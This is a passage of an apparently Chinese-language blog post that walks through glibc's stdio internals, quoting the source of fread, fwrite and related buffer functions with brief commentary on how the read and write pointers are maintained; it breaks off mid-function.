<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fread (<span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> bytes_requested = size * count;</span><br><span class="line">  <span class="type">size_t</span> bytes_read;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="type">char</span> *) buf, bytes_requested);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_file_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> want, have;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line">  <span class="type">char</span> *s = data;</span><br><span class="line"></span><br><span class="line">  want = n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">	  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">	  want = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">	      want -= have;</span><br><span class="line">	      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">	  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">	    &#123;</span><br><span class="line">	      _IO_switch_to_main_get_area (fp);</span><br><span class="line">	      <span class="keyword">continue</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">	     the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">	     the user buffer. */</span></span><br><span class="line">	  <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">	      &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">continue</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">	     waiting for input. */</span></span><br><span class="line">	  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">	  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">	  count = want;</span><br><span class="line">	  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">	      <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">		count -= want % block_size;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  count = _IO_SYSREAD (fp, s, count);</span><br><span class="line">	  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">		fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  s += count;</span><br><span class="line">	  want -= count;</span><br><span class="line">	  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">	    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocate a file buffer, or switch to unbuffered I/O.  Streams for</span></span><br><span class="line"><span class="comment">   TTY devices default to line buffered.  */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_doallocate (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">stat64_t64</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line">  size = BUFSIZ;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_fileno &gt;= <span class="number">0</span> &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), <span class="number">0</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (S_ISCHR (st.st_mode))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Possibly a tty.  */</span></span><br><span class="line">	  <span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEV_TTY_P</span></span><br><span class="line">	      DEV_TTY_P (&amp;st) ||</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      local_isatty (fp-&gt;_fileno))</span><br><span class="line">	    fp-&gt;_flags |= _IO_LINE_BUF;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _STATBUF_ST_BLKSIZE</span></span><br><span class="line">      <span class="keyword">if</span> (st.st_blksize &gt; <span class="number">0</span> &amp;&amp; st.st_blksize &lt; BUFSIZ)</span><br><span class="line">	size = st.st_blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  p = <span class="built_in">malloc</span> (size);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (p == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  _IO_setb (fp, p, p + size, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment">	 required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">	 traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">	 not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">	 explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">	  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">	_IO_OVERFLOW (<span class="built_in">stdout</span>, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">		       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">	fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">	 handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">	 unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h1><blockquote>
<p>总结下来就是一件事，维护指针</p>
<p>首先分配缓冲区，得到bufbase，bufend，接下来就是向其中写入数据，并找准时机刷新，但是可能会因为不确定因素报错入：目标文件无法写入等等。</p>
<p>需要明白writebase，writeend，writeptr这一组指针是怎么维护的即可。</p>
<p>也有缓冲区过小直接调用系统调用的情形。。。。。。</p>
</blockquote>
<p>大神点评：</p>
<p>从图中可以看到<code>fwrite</code>的主要实现在<code>_IO_new_file_xsputn</code>中，整体流程包含四个部分：</p>
<ol>
<li>首先判断输出缓冲区还有多少剩余，如果有剩余则将目标输出数据拷贝至输出缓冲区(一般第二次调用才会用上)。</li>
<li>如果输出缓冲区没有剩余（输出缓冲区未建立也是没有剩余）或输出缓冲区不够则调用<code>_IO_OVERFLOW</code>建立输出缓冲区或刷新输出缓冲区。</li>
<li>输出缓冲区刷新后判断剩余的目标输出数据是否超过块的size，如果超过块的size，则不通过输出缓冲区直接以块为单位，使用<code>new_do_write</code>输出目标数据。</li>
<li>如果按块输出数据后还剩下一点数据则调用<code>_IO_default_xsputn</code>将数据拷贝至输出缓冲区。</li>
</ol>
<p><img src="/img/mypic/io/fwrite.png" alt="fwrite"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> request = size * count;</span><br><span class="line">  <span class="type">size_t</span> written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">     this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">     simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">     buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  <span class="type">size_t</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">	  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		  count = p - s + <span class="number">1</span>;</span><br><span class="line">		  must_flush = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">	count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">	<span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">	   caller that everything has been written.  */</span></span><br><span class="line">	<span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">	&#123;</span><br><span class="line">	  count = new_do_write (f, s, do_write);</span><br><span class="line">	  to_do -= count;</span><br><span class="line">	  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">	    <span class="keyword">return</span> n - to_do;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">	 buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">	 so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">	to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end; </span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_do_write (FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (<span class="type">size_t</span>) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">	    count = more;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">	      s += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">	      <span class="type">ssize_t</span> i;</span><br><span class="line">	      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">		*p++ = *s++;</span><br><span class="line">	      f-&gt;_IO_write_ptr = p;</span><br><span class="line">	    &#125;</span><br><span class="line">	  more -= count;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span 